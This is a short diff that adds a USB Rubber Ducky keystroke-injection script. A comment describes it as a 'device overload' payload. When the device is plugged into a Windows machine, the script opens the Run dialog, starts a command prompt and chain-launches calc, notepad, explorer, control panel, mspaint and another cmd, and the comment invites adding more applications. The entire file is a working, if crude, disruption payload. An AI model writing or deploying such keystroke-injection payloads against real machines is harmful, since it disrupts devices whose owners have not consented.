@@ -1,0 +1,11 @@
+#author: Spase Sandoval
+#ducky script payload for device overload, where you are stringing applications for start calc && start notepad just add/modify application names with &&
+
+DELAY 5000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING start calc && start notepad && start explorer && start control && start mspaint && start cmd
+ENTER
